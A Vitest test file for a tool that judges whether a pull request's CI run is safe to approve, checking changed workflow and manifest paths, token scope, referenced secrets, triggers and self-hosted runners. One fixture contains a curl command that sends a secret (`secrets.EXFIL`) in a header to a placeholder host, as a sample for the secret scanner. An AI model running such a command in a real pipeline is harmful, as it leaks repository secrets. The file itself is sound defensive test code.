import { describe, expect, it } from "vitest";

import {
  assessBlastRadius,
  referencedSecretNames,
  triggersOnPullRequest,
  usesSelfHostedRunner,
  type WorkflowSafetyProfile,
} from "../src/approval.js";

const SAFE_PROFILE: WorkflowSafetyProfile = {
  defaultWorkflowPermissions: "read",
  referencedSecrets: [],
};

const assess = (
  changedFilePaths: string[],
  profile: WorkflowSafetyProfile = SAFE_PROFILE,
  truncated = false,
) => assessBlastRadius({ changedFilePaths, truncated, profile });

describe("assessBlastRadius", () => {
  it("approves an ordinary source-and-test change in a read-only, secretless repo", () => {
    const verdict = assess(["src/parse.ts", "test/parse.test.ts"]);
    expect(verdict.safe).toBe(true);
    expect(verdict.blockers).toEqual([]);
    // The assurances are what gets written to the issue, so they must be
    // populated — an approval with no stated reasoning is not an audit trail.
    expect(verdict.assurances.length).toBeGreaterThan(0);
  });

  // The review answers two questions that authorise two
  // different actions: "does this diff change what CI executes" justifies
  // approving one run, while "is a run in this repository bounded at all"
  // justifies relaxing the repository-wide approval requirement — the only
  // mechanism that releases a coding-agent hold (§9). Conflating them would let a
  // clean diff buy a permanent setting change it says nothing about.
  describe("separating repository-wide evidence from diff-scoped evidence", () => {
    it("reports repo scope safe when only the diff is at fault", () => {
      const verdict = assess(["src/ok.ts", ".github/workflows/ci.yml"]);
      expect(verdict.safe).toBe(false);
      expect(verdict.repoScopeSafe).toBe(true);
      expect(verdict.repoScopeBlockers).toEqual([]);
    });

    it("reports repo scope unsafe when the token is write-scoped", () => {
      const verdict = assess(["src/ok.ts"], {
        defaultWorkflowPermissions: "write",
        referencedSecrets: [],
      });
      expect(verdict.repoScopeSafe).toBe(false);
      expect(verdict.repoScopeBlockers).toHaveLength(1);
    });

    it("reports repo scope unsafe when a pull-request workflow reaches a secret", () => {
      const verdict = assess(["src/ok.ts"], {
        defaultWorkflowPermissions: "read",
        referencedSecrets: ["NPM_TOKEN"],
      });
      expect(verdict.repoScopeSafe).toBe(false);
      expect(verdict.repoScopeBlockers.join(" ")).toContain("NPM_TOKEN");
    });

    it("keeps repo-scope blockers a subset of all blockers", () => {
      const verdict = assess(["src/ok.ts", ".github/workflows/ci.yml"], {
        defaultWorkflowPermissions: "write",
        referencedSecrets: ["NPM_TOKEN"],
      });
      for (const blocker of verdict.repoScopeBlockers) {
        expect(verdict.blockers).toContain(blocker);
      }
      // So `safe` can never be true while `repoScopeSafe` is false.
      expect(verdict.safe).toBe(false);
    });
  });

  describe("changes that would let the diff redefine what CI executes", () => {
    it.each([
      [".github/workflows/ci.yml", "workflow definition"],
      [".github/workflows/nested/deploy.yaml", "workflow in a subdirectory"],
      [".github/actions/setup/action.yml", "composite action"],
      [".github/dependabot.yml", "other repository automation"],
      ["tools/my-action/action.yaml", "action definition outside .github"],
    ])("denies %s (%s)", (path) => {
      const verdict = assess(["src/ok.ts", path]);
      expect(verdict.safe).toBe(false);
      expect(verdict.blockers.join(" ")).toContain(path);
    });

    it.each([
      "package.json",
      "package-lock.json",
      "yarn.lock",
      "pnpm-lock.yaml",
      "go.sum",
      "Cargo.lock",
      "requirements.txt",
    ])("denies dependency manifest %s", (path) => {
      // Installing dependencies runs their lifecycle scripts in CI, so a
      // manifest edit is arbitrary code execution regardless of the source diff.
      expect(assess(["src/ok.ts", path]).safe).toBe(false);
    });

    it("denies a manifest nested in a workspace package, not just at the root", () => {
      expect(assess(["packages/api/package.json"]).safe).toBe(false);
    });

    it.each([".npmrc", ".yarnrc.yml", "config/.pypirc"])(
      "denies registry configuration %s",
      (path) => {
        expect(assess([path]).safe).toBe(false);
      },
    );

    it("matches case-insensitively, since paths differ across platforms", () => {
      expect(assess([".GitHub/Workflows/CI.yml"]).safe).toBe(false);
      expect(assess(["Package.JSON"]).safe).toBe(false);
    });

    it("does not deny a source file that merely looks workflow-adjacent", () => {
      // Guards against an over-broad substring match: these are ordinary files.
      const verdict = assess([
        "src/workflows/engine.ts",
        "docs/package.json.md",
        "test/action.yml.test.ts",
      ]);
      expect(verdict.safe).toBe(true);
    });

    it("reports every offending path, not just the first", () => {
      const verdict = assess([".github/workflows/ci.yml", "package.json", ".npmrc"]);
      expect(verdict.blockers).toHaveLength(3);
    });
  });

  describe("what an approved run would be able to reach", () => {
    it("denies when workflow runs get a write-scoped token by default", () => {
      const verdict = assess(["src/ok.ts"], {
        defaultWorkflowPermissions: "write",
        referencedSecrets: [],
      });
      expect(verdict.safe).toBe(false);
      expect(verdict.blockers.join(" ")).toContain("write");
    });

    it("denies when the token scope could not be determined", () => {
      // Fails closed: an unreadable setting is not evidence of a safe setting.
      const verdict = assess(["src/ok.ts"], {
        defaultWorkflowPermissions: "unknown",
        referencedSecrets: [],
      });
      expect(verdict.safe).toBe(false);
    });

    it("denies when a pull-request workflow references real secrets", () => {
      const verdict = assess(["src/ok.ts"], {
        defaultWorkflowPermissions: "read",
        referencedSecrets: ["NPM_TOKEN", "SLACK_WEBHOOK"],
      });
      expect(verdict.safe).toBe(false);
      expect(verdict.blockers.join(" ")).toContain("NPM_TOKEN");
    });
  });

  describe("incomplete evidence", () => {
    it("denies a truncated file list even when nothing visible is dangerous", () => {
      // The workflow file could be on the page we did not see.
      const verdict = assess(["src/ok.ts"], SAFE_PROFILE, true);
      expect(verdict.safe).toBe(false);
      expect(verdict.blockers.join(" ")).toContain("truncated");
    });

    it("denies an empty diff", () => {
      expect(assess([]).safe).toBe(false);
    });

    it("does not claim assurances it has not established", () => {
      const verdict = assess(["src/ok.ts"], SAFE_PROFILE, true);
      expect(verdict.assurances.join(" ")).not.toContain("changed path");
    });
  });
});

describe("referencedSecretNames", () => {
  it("treats `secrets: inherit` as an unbounded secret reference", () => {
    // The caller names no secret and the callee is a workflow_call workflow that
    // triggersOnPullRequest skips, so both halves evade a name-based scan.
    const yaml = [
      "on: pull_request",
      "jobs:",
      "  build:",
      "    uses: ./.github/workflows/build.yml",
      "    secrets: inherit",
    ].join("\n");
    expect(referencedSecretNames(yaml)).toEqual(["<inherit: every repository secret>"]);
  });

  it("finds dotted references", () => {
    expect(referencedSecretNames("token: ${{ secrets.NPM_TOKEN }}")).toEqual(["NPM_TOKEN"]);
  });

  it("finds bracketed references", () => {
    expect(referencedSecretNames("${{ secrets['DEPLOY_KEY'] }}")).toEqual(["DEPLOY_KEY"]);
  });

  it("ignores GITHUB_TOKEN, which is governed by the permissions check instead", () => {
    expect(referencedSecretNames("${{ secrets.GITHUB_TOKEN }}")).toEqual([]);
  });

  it("deduplicates and sorts", () => {
    const yaml = "${{ secrets.B }} ${{ secrets.A }} ${{ secrets.B }}";
    expect(referencedSecretNames(yaml)).toEqual(["A", "B"]);
  });

  it("finds a secret used inside a run block, where a YAML parse would hide it", () => {
    const yaml = ["    - run: |", '        curl -H "$${{ secrets.EXFIL }}" x'].join("\n");
    expect(referencedSecretNames(yaml)).toEqual(["EXFIL"]);
  });

  it("returns nothing for a workflow with no secrets", () => {
    expect(referencedSecretNames("on: pull_request\njobs:\n  t:\n    steps: []")).toEqual([]);
  });
});

describe("triggersOnPullRequest", () => {
  it("detects a pull_request trigger", () => {
    expect(triggersOnPullRequest("on:\n  pull_request:\n    branches: [main]")).toBe(true);
  });

  it("detects pull_request_target, which is the more dangerous variant", () => {
    expect(triggersOnPullRequest("on:\n  pull_request_target:")).toBe(true);
  });

  it("detects the flow-sequence form, which is idiomatic and was previously missed", () => {
    // The original regex required a colon after the trigger name, so this
    // extremely common spelling was judged not PR-triggered and its secrets
    // were dropped from the scan entirely.
    expect(triggersOnPullRequest("on: [push, pull_request]\njobs: {}")).toBe(true);
  });

  it("detects the bare scalar form", () => {
    expect(triggersOnPullRequest("on: pull_request\njobs: {}")).toBe(true);
  });

  it("detects the block-sequence form", () => {
    expect(triggersOnPullRequest("on:\n  - push\n  - pull_request\njobs: {}")).toBe(true);
  });

  it("detects a quoted `on` key, which YAML permits", () => {
    expect(triggersOnPullRequest('"on": [pull_request]')).toBe(true);
  });

  it("ignores a workflow that only runs on a schedule or release", () => {
    // Approving a PR run cannot start these, so their secrets are out of scope.
    expect(triggersOnPullRequest("on:\n  schedule:\n    - cron: '0 0 * * *'")).toBe(false);
    expect(triggersOnPullRequest("on:\n  release:\n    types: [published]")).toBe(false);
  });

  it("does not treat a later top-level key as part of the trigger block", () => {
    // `pull_request` appears in a job condition, not in `on:`. Reading past the
    // block would misclassify a push-only workflow as PR-triggered.
    const yaml = [
      "on:",
      "  push:",
      "jobs:",
      "  build:",
      "    if: github.event_name == 'pull_request'",
    ].join("\n");
    expect(triggersOnPullRequest(yaml)).toBe(false);
  });

  it("assumes pull-request-triggered when the triggers cannot be determined", () => {
    // Deny-side default: a false negative here silently drops a workflow's
    // secrets from the review, which is the dangerous direction.
    expect(triggersOnPullRequest("jobs:\n  build:\n    steps: []")).toBe(true);
  });
});

describe("usesSelfHostedRunner", () => {
  it("flags an explicit self-hosted runner", () => {
    // A read-only token and no secrets do not make a self-hosted runner a
    // sandbox: persistent state and network position are reachable from it.
    expect(usesSelfHostedRunner("jobs:\n  b:\n    runs-on: [self-hosted, linux]")).toBe(true);
  });

  it("does not flag GitHub-hosted runners", () => {
    expect(usesSelfHostedRunner("jobs:\n  b:\n    runs-on: ubuntu-latest")).toBe(false);
  });
});
